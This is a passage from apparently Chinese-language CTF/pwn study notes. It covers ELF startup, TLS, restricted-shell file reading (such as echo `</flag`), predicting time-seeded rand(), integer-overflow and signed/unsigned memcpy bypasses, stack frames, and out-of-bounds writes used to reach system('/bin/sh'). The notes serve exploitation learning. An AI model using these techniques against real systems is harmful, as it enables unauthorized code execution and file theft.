</span></span></span><span class=line><span class=cl><span class=c1></span>                 <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>rtld_fini</span><span class=p>)</span> <span class=p>(</span><span class=kt>void</span><span class=p>),</span> 	<span class=c1>// 动态加载有关的收尾工作, 动态链接默认是 _dl_fini 函数指针
</span></span></span><span class=line><span class=cl><span class=c1></span>                 <span class=kt>void</span> <span class=o>*</span><span class=n>stack_end</span><span class=p>)</span> 			<span class=c1>// 栈底的地址
</span></span></span></code></pre></div></div></li></ul><p><strong>__libc_start_main</strong>：<code>csu/libc-start.c</code>中</p><p><strong>__libc_csu_init</strong>： <code>csu/elf-init.c</code>中</p><p>linux 程序执行流程：</p><img src=/img/pwn_note.zh-cn.assets/172844664601226.png alt=图片无法加载><p>内核执行过程：<code>sys_execve()</code> -> <code>do_execve_common()</code> -> <code>search_binary_handler()</code> -> <code>load_elf_binary()</code> -> <code>create_elf_tables()</code>，<code>create_elf_tables()</code>会添加辅助向量条目</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>NEW_AUX_ENT</span><span class=p>(</span><span class=n>AT_PAGESZ</span><span class=p>,</span> <span class=n>ELF_EXEC_PAGESIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>NEW_AUX_ENT</span><span class=p>(</span><span class=n>AT_PHDR</span><span class=p>,</span> <span class=n>load_addr</span> <span class=o>+</span> <span class=n>exec</span><span class=o>-&gt;</span><span class=n>e_phoff</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>NEW_AUX_ENT</span><span class=p>(</span><span class=n>AT_PHENT</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>elf_phdr</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nf>NEW_AUX_ENT</span><span class=p>(</span><span class=n>AT_PHNUM</span><span class=p>,</span> <span class=n>exec</span><span class=o>-&gt;</span><span class=n>e_phnum</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>NEW_AUX_ENT</span><span class=p>(</span><span class=n>AT_BASE</span><span class=p>,</span> <span class=n>interp_load_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>NEW_AUX_ENT</span><span class=p>(</span><span class=n>AT_ENTRY</span><span class=p>,</span> <span class=n>exec</span><span class=o>-&gt;</span><span class=n>e_entry</span><span class=p>);</span></span></span></code></pre></div></div><h3 id=虚拟空间>虚拟空间</h3><p>虚拟内存 mmap 段中的动态链接库仅在物理内存中装载一份</p><ul><li>每个进程有自己虚拟地址空间，由连续虚拟地址组成，不直接访问物理内存地址</li><li>OS 将其分为多个区域【代码段：可执行程序机器指令；数据段：静态及全局变量<code>.bss .data ...</code>；动态链接段】</li><li>加载器将这些短从 ELF 文件复制到相应虚拟内存地址，通过页表建立虚拟和物理内存地址映射关系</li></ul><h2 id=tls-结构体>TLS 结构体</h2><p>线程可访问进程内存所有数据，全局变量若用<code>__thread</code>修饰则为线程私有的 TLS 数据，即每个线程都在自己所属 TLS 中单独存一份该变量副本</p><p><strong>私有数据</strong>：局部变量、函数参数、TLS 数据（线程局部存储 Thread Local Storage）</p><p><strong>共享数据</strong>：全局变量、堆上数据、函数中静态变量、程序代码、打开文件</p><ul><li><code>.tdata</code>节记录已初始化的 TLS 数据；<code>.tbss</code>节记录未初始化的 TLS 数据，ELF 中不占空间</li><li>2 节加载到内存中合并为一个段程序头表中这个段的 <code>p_type</code> 为 <code>PT_TLS(7)</code></li></ul><p>每一个线程中每一个使用了 TLS 功能的模块都拥有一个 TLS Block，<code>dtv</code> 数组中的每一项都是 TLS Block 的入口，程序使用 <code>dlopen</code> 函数或者 <code>dlfree</code> 函数加载或者卸载一个具备 TLS 变量的模块</p><img src=/img/pwn_note.zh-cn.assets/image-20241103213151137.png alt=图片无法加载><p><strong>主线程 TLS 初始化</strong>： <code>main</code> 开始前调用 <code>__libc_setup_tls</code> 初始化 TLS，遍历找到段调用<code>brk</code>为 TLS 数据和<code>pthread</code>结构体分配内存，然后初始化<code>dtv</code>数组，</p><p><strong>创建线程时 TLS 初始化</strong>：<code>pthread_create</code> 调用 <code>__pthread_create_2_1</code> 函数，该函数中调用<code>allocate_stack</code>中的<code>mmap</code> 为线程分配栈空间，初始化栈底为一个 <code>pthread</code> 结构体并将指针 <code>pd</code> 指向该结构体。最后调用 <code>_dl_allocate_tls</code> 函数为 TCB 创建 <code>dtv</code> 数组， fs 寄存器不能在用户态修改</p><h2 id=终端处理>终端处理</h2><p>① 只有<code>echo</code>命令</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=nb>echo</span> <span class=sb>`</span>&lt;/flag<span class=sb>`</span> <span class=c1># 将``包裹的子命令 /flag 内容输出到 echo 中读出</span></span></span></code></pre></div></div><p>② linux 存在一些内置命令：<code>cd, echo, read, pwd, source</code>，若没有<code>cat</code>等，可以通过以下代码在 shell 直接逐行查看文件内容</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=k>while</span> <span class=nv>IFS</span><span class=o>=</span> <span class=nb>read</span> -r line<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$line</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=k>done</span> &lt; filename</span></span></code></pre></div></div><p>③ 当使用<code>rm</code>删除某个文件后，可通过以下方法恢复</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>lsof <span class=p>|</span> grep deletefile <span class=c1># 找到进程</span>
</span></span><span class=line><span class=cl>cp /proc/self/fd/1 ~/deletefile.backup <span class=c1># self表示当前进程</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>root@docking ~<span class=o>]</span><span class=c1># cd /proc/21796/fd</span>
</span></span><span class=line><span class=cl><span class=o>[</span>root@docking fd<span class=o>]</span><span class=c1># ll</span>
</span></span><span class=line><span class=cl>总用量 <span class=m>0</span>
</span></span><span class=line><span class=cl>lrwx------ <span class=m>1</span> root root <span class=m>64</span> 1月  <span class=m>18</span> 22:21 <span class=m>0</span> -&gt; /dev/pts/0
</span></span><span class=line><span class=cl>l-wx------ <span class=m>1</span> root root <span class=m>64</span> 1月  <span class=m>18</span> 22:21 <span class=m>1</span> -&gt; /root/deletefile.txt <span class=o>(</span>deleted<span class=o>)</span>
</span></span><span class=line><span class=cl>lrwx------ <span class=m>1</span> root root <span class=m>64</span> 1月  <span class=m>18</span> 22:21 <span class=m>2</span> -&gt; /dev/pts/0</span></span></code></pre></div></div><p>④ 退格键应用</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;abcdefg</span><span class=se>\x08\x08</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># \x08为退格键即backspace, 在linux中使用cat a时将只会读出abcde</span></span></span></code></pre></div></div><h2 id=随机数>随机数</h2><h3 id=random>random</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>time_t</span> <span class=n>timer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>tm</span> <span class=o>*</span><span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>secret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>timer</span> <span class=o>=</span> <span class=nf>time</span><span class=p>(</span><span class=mi>0LL</span><span class=p>);</span> <span class=c1>// 当前时间
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>v3</span> <span class=o>=</span> <span class=nf>localtime</span><span class=p>(</span><span class=o>&amp;</span><span class=n>timer</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>srandom</span><span class=p>(</span><span class=n>v3</span><span class=o>-&gt;</span><span class=n>tm_yday</span><span class=p>);</span> <span class=c1>// 设置种子 为tm结构中的yday
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=n>secret</span> <span class=o>=</span> <span class=nf>random</span><span class=p>()</span> <span class=c1>// 种子数相同，多次得到的随机值相同
</span></span></span></code></pre></div></div><p>利用<strong>当前时间戳</strong>进行预测</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>cdll</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=n>clib</span> <span class=o>=</span> <span class=n>cdll</span><span class=o>.</span><span class=n>LoadLibrary</span><span class=p>(</span><span class=s1>&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>seed</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>clib</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>seed</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pwd</span> <span class=o>=</span> <span class=n>clib</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span></span></span></code></pre></div></div><h3 id=devrandom>/dev/random</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// 基于物理设备噪声熵值 真随机 熵池不足会阻塞
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>random_file</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;/dev/random&#34;</span><span class=p>,</span> <span class=s>&#34;rb&#34;</span><span class=p>);</span> <span class=c1>// 打开系统/dev/random设备
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>fread</span><span class=p>(</span><span class=o>&amp;</span><span class=n>secret</span><span class=p>,</span> <span class=mi>4uLL</span><span class=p>,</span> <span class=mi>1uLL</span><span class=p>,</span> <span class=n>random_file</span><span class=p>);</span> <span class=c1>// 读 1 个 4 字节的数据块，存入secret地址中
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>fclose</span><span class=p>(</span><span class=n>random_file</span><span class=p>);</span></span></span></code></pre></div></div><h3 id=arc4random>arc4random</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// 基于 ARC4（Alleged RC4） 加密算法实现高质量伪随机数 无符号32位随机整数
</span></span></span><span class=line><span class=cl><span class=c1>// 操作系统中不显式初始化种子
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>secret</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>arc4random</span><span class=p>()</span></span></span></code></pre></div></div><p>若有循环函数及<strong>模数</strong>可以进行<strong>爆破</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>num</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>num</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s2>&#34;xxx&#34;</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span></span></span></code></pre></div></div><h2 id=整数溢出漏洞>整数溢出漏洞</h2><p>下标溢出（越界）：程序未规定上下界，数字溢出，导致可以访问线性地址上内容</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%u&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v1</span><span class=p>);</span> <span class=c1>// 未限制下标
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>now</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int64</span><span class=p>)</span><span class=o>&amp;</span><span class=n>saves</span><span class=p>[</span><span class=mi>8</span> <span class=o>*</span> <span class=n>v1</span><span class=p>];</span> <span class=c1>// 将saves数组外地址加载入now, 若能对now指向地址更改可任意地址写
</span></span></span></code></pre></div></div><p><strong>漏洞点</strong>：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x100</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>len</span><span class=p>);</span> <span class=c1>// len转换为无符号整型, 则输入-1可以向buf输入极大数量的值
</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>*</span><span class=p>((</span><span class=kt>void</span> <span class=o>**</span><span class=p>)</span><span class=o>&amp;</span><span class=n>record</span> <span class=o>+</span> <span class=n>v4</span><span class=p>),</span> <span class=mh>0x80uLL</span><span class=p>);</span> <span class=c1>// 通过构造v4进行任意地址写
</span></span></span></code></pre></div></div><p><strong>memcpy 绕过</strong></p><p>计算机中用补码存储有符号数，正数就是原码，负数需按位取反加一</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>_isoc99_scanf</span><span class=p>((</span><span class=n>unsigned</span> <span class=nb>int</span><span class=p>)</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>unsigned</span> <span class=nb>int</span><span class=p>)</span><span class=o>&amp;</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>&gt;</span> <span class=mi>16</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s2>&#34;Number out of range!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=n>memcpy</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span> <span class=c1># memcpy中的size 为 size_t</span>
</span></span><span class=line><span class=cl>    <span class=c1># typedef unsigned long size_t; 即无符号整数</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>调试发现<strong>比较</strong>代码为：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>cmp</span> <span class=n>eax</span><span class=p>,</span> <span class=mi>10</span><span class=n>h</span> <span class=c1># eax为32位 且此时将eax作为有符号整数看</span></span></span></code></pre></div></div><p><strong>计组知识</strong></p><p>通过构造 size 为【作为有符号数是负数，作为无符号数为一个极大数】</p><table><thead><tr><th>输入</th><th>rax</th><th>eax</th><th>有符号比较</th><th>无符号复制</th><th></th></tr></thead><tbody><tr><td>-1</td><td>FFFF FFFF FFFF FFFF</td><td>FFFF FFFF</td><td>-1 &lt; 16</td><td></td><td>绕过但崩溃</td></tr><tr><td>-23923</td><td>FFFF FFFF FFFF A28D</td><td>FFFF A28D</td><td>-23923 &lt; 16</td><td></td><td>绕过 getshell</td></tr><tr><td>4294967200</td><td>0000 0000 FFFF FFA0</td><td>FFFF FFA0</td><td>-96 &lt; 16</td><td></td><td>绕过 getshell</td></tr><tr><td>-2147483896</td><td>FFFF FFFF 7FFF FF08</td><td>7FFF FF08(第一位为 0 表正数)</td><td>2147483400 > 16</td><td></td><td>未绕过崩溃</td></tr></tbody></table><p>【<strong>调试方法</strong>】</p><p>根据相应汇编看寄存器的变化值，然后逆向使用 python 进行相反运算获取对应十六进制值再转换为十进制，最终可以根据调试构造出所需要的 size 大小，进而若有可控制的数组偏移如下，即可利用更改内存值</p><h2 id=栈溢出漏洞>栈溢出漏洞</h2><h3 id=栈基础>栈基础</h3><p>函数调用栈在内存中<strong>从高地址向低地址生长</strong>，所以栈顶对应内存地址压栈时变小，退栈时变大</p><img src=/img/pwn_note.zh-cn.assets/17284464998305.png alt=图片无法加载><ul><li>紧邻 ebp 的【stack frame pointer】保存父进程/函数的 ebp 地址</li><li>子函数的参数保存在父函数栈帧末尾，返回地址前的 arguments 中</li></ul><p><strong>函数调用栈</strong></p><p><code>ebp</code>：存储当前函数状态的基地址</p><p><code>esp</code>：存储函数调用栈的栈顶地址</p><p><code>eip</code>：存储即将执行的程序指令的地址</p><ul><li><p>32 位栈的<strong>三层嵌套</strong>调用演示：<code>main -> func1 -> func2</code></p></li><li><p>arg1,2,3 是 func1 函数的参数，但在 main 函数栈帧中</p></li><li><p>当局部变量是数组<code>v[2]</code>时，索引低的<code>v[0]</code>靠近 rsp，地址更低，索引高的<code>v[1]</code>靠近 rbp，地址更高</p></li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241102182719351.png alt=图片无法加载><p><strong>函数开头及结尾</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-Assembly data-lang=Assembly>push ebp
mov ebp, esp
leave
#等价于 mov esp, ebp    有局部变量的情况
#      pop ebp
retn
#等价于 pop eip，实际没有该指令</code></pre></div><p><strong>压栈</strong></p><ol><li>被调用函数参数<strong>逆序</strong>压入栈内，esp→（arg1, arg2,&mldr;,argn）</li><li>将<strong>调用函数进行调用之后的下一条指令地址</strong>作为<strong>返回地址</strong>压入栈内，即<strong>调用函数</strong>的 <strong>eip</strong> 信息得以保存<ol><li>（call xxx）</li></ol></li><li>将当前的 ebp 的值（调用函数的基地址）压入栈内，将<strong>ebp 寄存器值</strong>更新为<strong>当前栈顶的地址</strong>，即 ebp 更新为被调用函数的基地址</li><li>被调用函数的局部变量压入栈内，只 esp 动</li></ol><p><strong>出栈</strong></p><ol><li>被调用函数局部变量栈内弹出，栈顶 esp 指向被调用函数的基地址 ebp</li><li>基地址内存储的调用函数的基地址从栈内弹出到 ebp 寄存器中，调用函数的 ebp 得以恢复，栈顶 esp 指向返回地址</li></ol><p><strong>传参</strong></p><ul><li><p><strong>系统调用 syscall</strong>参数传递</p><ul><li>x86_32：参数小于等于 6 个，ebx,ecx,edx,esi,edi,ebp 中；大于 6 个，全部参数放在一块连续内存区域，ebx 保存指向该区域的指针，eax 存系统调用号<ul><li>使用<code>int 0x80</code></li></ul></li><li>x86_64：参数小于等于 6 个，rdi,rsi,rdx,r10,r8,r9；大于 6 个，全部参数放在一块连续内存区域，rbx 保存指向该区域的指针<ul><li>使用<code>syscall</code>，rax 放每个 system call 函数对应的索引</li></ul></li></ul></li><li><p><strong>函数 function</strong>参数传递</p><ul><li>x86_32/x86：从右至左顺序压参数入栈，栈传递参数，eax 存放返回值</li><li>x86_64/amd64：参数少于 7 个时，从左到右：rdi,rsi,rdx,rcx,r8,r9 中，大于 7 个，后面的从“右向左”放入栈中</li></ul></li></ul><h3 id=oob>OOB</h3><p>Out-of-Bounds，包括数组越界、指针偏移、使用后释放 UAF 等</p><p><strong>写后判断</strong></p><p>通过该漏洞可以造成越界写内容，若 arg_list 在 bss 段可以借此<strong>越界改其他 bss 段上的变量</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>next_args</span> <span class=o>=</span> <span class=nf>strtok</span><span class=p>(</span><span class=mi>0LL</span><span class=p>,</span> <span class=s>&#34; &#34;</span><span class=p>);</span> <span class=c1>// 获取命令行输入参数遍历
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>next_args</span> <span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>next_args</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>31</span> <span class=p>){</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=n>nargs</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>arg_list</span><span class=p>[</span><span class=mi>32</span> <span class=o>*</span> <span class=n>i</span><span class=p>],</span> <span class=n>next_args</span><span class=p>);</span> <span class=c1>// 漏洞点: 先写入arg_list再判断是否大于10
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>nargs</span> <span class=o>&lt;=</span> <span class=mi>10</span> <span class=p>){</span> <span class=k>return</span> <span class=n>idx</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;}</span></span></span></code></pre></div></div><p><strong>调用越界</strong></p><ul><li>先任意写入 system 地址到 bss 段，尝试越界修改 bss 段中 idx 使得偏移调用 system 函数</li><li><code>arg_list</code>也可尝试任意地址写入<code>'/bin/sh'</code></li><li>注意有时<code>p64(0xab)</code>时使用<code>replace(b'\x00', b'')</code>或<code>p64(0x123456781234)[:6]</code>替换防止提前 0 截断</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
